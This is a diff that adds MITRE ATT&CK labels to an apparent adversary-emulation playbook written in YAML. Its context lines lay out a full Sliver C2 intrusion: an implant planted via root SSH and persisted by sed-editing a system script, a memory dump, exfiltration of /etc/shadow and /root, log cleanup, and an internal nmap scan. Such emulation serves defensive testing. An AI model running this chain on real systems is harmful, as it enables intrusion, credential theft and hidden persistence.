@@ -22,6 +22,9 @@ commands:
     username: root
     key_filename: $SSH_KEY
     creates_session: "root"
+    metadata:
+      techniques: "T1021"
+      tactics: "Lateral Movement"
 
   - type: sliver
     cmd: "generate_implant"
@@ -32,6 +35,9 @@ commands:
     cmd: start_https_listener
     host: 0.0.0.0
     port: 443
+    metadata:
+      techniques: "T1071,T1573"
+      tactics: "Command and Control"
 
   - type: shell
     cmd: ls $IMPLANTPATH
@@ -42,24 +48,39 @@ commands:
     remote_path: /usr/bin/zmcontroller
     mode: "755"
     session: "root"
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
 
   - type: ssh
     cmd: sed -i 's/#!\/bin\/sh/#!\/bin\/sh\n\/usr\/bin\/zmcontroller \&\n/' /usr/share/awffull/awffull
     session: "root"
+    metadata:
+      techniques: "T1547,T1569"
+      tactics: "Persistence,Execution"
 
   - type: sliver-session
     cmd: ls
     remote_path: "."
     session: superimplant
+    metadata:
+      techniques: "T1083"  
+      tactics: "Discovery"
 
   - type: sliver-session
     cmd: ps
     session: superimplant
+    metadata:
+      techniques: "T1057"
+      tactics: "Discovery"
 
   - type: regex
     cmd: (\d+) .*mariadb
     output:
       PROCESS: "$MATCH_0"
+    metadata:
+     techniques: "T1007"  
+     tactics: "Discovery" 
 
   - type: debug
     cmd: "$PROCESS"
@@ -72,14 +93,23 @@ commands:
     pid: 1
     session: superimplant
     local_path: $TEMPPROCDUMP
+    metadata:
+      techniques: "T1003"
+      tactics: "Credential Access"
 
   - type: sliver-session
     cmd: netstat
     session: superimplant
+    metadata:
+      techniques: "T1049"
+      tactics: "Discovery"
 
   - type: sliver-session
     cmd: ifconfig
     session: superimplant
+    metadata:
+      techniques: "T1082"
+      tactics: "Discovery"
 
   - type: mktemp
     variable: SHADOW
@@ -89,6 +119,9 @@ commands:
     remote_path: /etc/shadow
     local_path: $SHADOW
     session: superimplant
+    metadata:
+      techniques: "T1552,T1005,T1041"
+      tactics: "Credential Access,Collection,Exfiltration"
 
   - type: sliver-session
     cmd: execute
@@ -98,6 +131,9 @@ commands:
       - /tmp/r.tar.gz
       - /root
     session: superimplant
+    metadata:
+      techniques: "T1560,T1074,T1005"
+      tactics: "Collection,Exfiltration"
 
   - type: mktemp
     variable: ROOTTAR
@@ -110,11 +146,17 @@ commands:
     remote_path: /tmp/r.tar.gz
     local_path: $ROOTTAR
     session: superimplant
+    metadata:
+      techniques: "T1041"
+      tactics: "Exfiltration"
 
   - type: sliver-session
     cmd: rm
     remote_path: /tmp/r.tar.gz
     session: superimplant
+    metadata:
+      techniques: "T1070"
+      tactics: "Defense Evasion"
 
   - type: sliver-session
     cmd: download
@@ -122,6 +164,9 @@ commands:
     local_path: $ROOTTAR2
     recurse: True
     session: superimplant
+    metadata:
+      techniques: "T1005"
+      tactics: "Collection"
 
   - type: sliver-session
     cmd: execute
@@ -129,6 +174,9 @@ commands:
     args:
       - /etc/pam.d/common-password
     session: superimplant
+    metadata:
+      techniques: "T1201"
+      tactics: "Discovery"
 
   - type: sliver-session
     cmd: execute
@@ -136,6 +184,9 @@ commands:
     args:
       - /etc/passwd
     session: superimplant
+    metadata:
+      techniques: "T1087"
+      tactics: "Discovery"
 
   - type: sliver-session
     cmd: execute
@@ -144,12 +195,18 @@ commands:
       - -l
       - $USER
     session: superimplant
+    metadata:
+      techniques: "T1201"
+      tactics: "Discovery"
 
   - type: sliver-session
     cmd: upload
     local_path: /var/www/html/nmap
     remote_path: /tmp/nmap
     session: superimplant
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
 
   - type: sliver-session
     cmd: execute
@@ -158,6 +215,9 @@ commands:
       - "755"
       - /tmp/nmap
     session: superimplant
+    metadata:
+      techniques: "T1106"
+      tactics: "Execution"
 
   - type: sliver-session
     cmd: execute
@@ -165,4 +225,7 @@ commands:
     args:
       - 172.17.100.0/24
     session: superimplant
+    metadata:
+      techniques: "T1046,T1018"
+      tactics: "Discovery"
 
